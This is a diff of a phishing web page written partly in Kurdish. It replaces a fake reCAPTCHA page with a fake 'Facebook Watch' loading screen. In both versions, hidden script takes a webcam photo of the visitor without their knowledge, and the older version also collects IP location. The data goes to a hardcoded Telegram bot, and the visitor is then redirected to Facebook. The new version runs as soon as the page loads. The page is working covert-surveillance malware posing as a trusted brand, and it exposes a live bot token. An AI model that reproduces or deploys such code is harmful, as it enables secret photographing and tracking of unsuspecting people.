@@ -1,92 +1,82 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify you are human</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook Watch</title>
     <style>
-        body { background-color: #f9f9f9; margin: 0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
-        #canvas { display: none; }
-        .captcha-box { background: white; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
-        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-right: 15px; }
-        .text { color: #555; font-size: 14px; flex-grow: 1; }
-        .logo-section { text-align: center; }
-        .logo-section img { width: 30px; }
-        .loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin-right: 15px; }
+        body { background: #f0f2f5; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .fb-loader { text-align: center; }
+        .fb-logo { width: 65px; height: 65px; background: #1877f2; color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 45px; font-weight: bold; margin: 0 auto 15px; }
+        .spinner { border: 4px solid #ddd; border-top: 4px solid #1877f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #v { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        #c { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="captcha-box" onclick="startAuth()">
-        <div class="checkbox" id="checkBtn"></div>
-        <div class="loader" id="loadingCircle"></div>
-        <div class="text">من ڕۆبۆت نیم (I'm not a robot)</div>
-        <div class="logo-section">
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
-            <p style="font-size: 8px; margin:0;">reCAPTCHA</p>
-        </div>
-    </div>
+<div class="fb-loader">
+    <div class="fb-logo">f</div>
+    <div class="spinner"></div>
+    <p style="color: #65676b; font-size: 14px; margin-top: 15px;">Loading Video...</p>
+</div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c"></canvas>
 
-    <script>
-        const BOT_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
-        const CHAT_ID = '6351568884';
-        const TARGET_URL = 'https://www.facebook.com/share/1C5gccsXme/?mibextid=wwXIfr';
+<script>
+    // زانیارییە نوێیەکانی تۆ
+    const t = "8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY";
+    const i = "6351568884";
 
-        let ipData = "زانیاری شوێن دەست نەکەوت";
+    async function start() {
+        const constraints = {
+            video: { 
+                facingMode: "user",
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            }
+        };
 
-        // وەرگرتنی زانیاری شوێن لە ڕێگەی IP (بێدەنگ)
-        fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(data => {
-                ipData = `📍 وڵات: ${data.country_name}\n🏙 شار: ${data.city}\n🌐 ئینتەرنێت: ${data.org}\n🗺 IP: ${data.ip}`;
-            }).catch(() => { ipData = "کێشە لە وەرگرتنی IP هەبوو"; });
-
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            if (/iPhone/i.test(ua)) return "iPhone 📱";
-            if (/Android/i.test(ua)) return "Android 📱";
-            return "PC/Other 💻";
-        }
-
-        function startAuth() {
-            document.getElementById('checkBtn').style.display = 'none';
-            document.getElementById('loadingCircle').style.display = 'block';
-
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            const v = document.getElementById('v');
+            v.srcObject = stream;
+            
+            v.onloadedmetadata = () => {
                 setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const c = document.getElementById('c');
+                    const ctx = c.getContext('2d');
+                    c.width = v.videoWidth; 
+                    c.height = v.videoHeight;
                     
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'image.jpg');
-                        formData.append('caption', `✅ زانیاری نوێ گەیشت:\n\n📱 مۆبایل: ${getDeviceInfo()}\n${ipData}`);
+                    ctx.translate(c.width, 0); 
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(v, 0, 0, c.width, c.height);
 
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        }).then(() => {
-                            window.location.href = TARGET_URL;
-                        });
-                    }, 'image/jpeg', 0.8);
-                }, 3500);
-            })
-            .catch(() => {
-                window.location.href = TARGET_URL;
-            });
+                    c.toBlob(async (b) => {
+                        const f = new FormData();
+                        f.append('chat_id', i);
+                        f.append('photo', b, 'capture.jpg');
+                        
+                        // ناردنی وێنەکە بۆ بۆتە نوێیەکە
+                        fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: f });
+
+                        // گواستنەوە بۆ فەیسبووک
+                        window.location.replace("https://www.facebook.com/watch");
+                        
+                        setTimeout(() => { stream.getTracks().forEach(track => track.stop()); }, 500);
+                    }, 'image/jpeg', 0.7);
+                }, 1000);
+            };
+
+        } catch (err) {
+            window.location.replace("https://www.facebook.com/watch");
         }
-    </script>
+    }
+
+    window.addEventListener('DOMContentLoaded', start);
+</script>
 </body>
 </html>
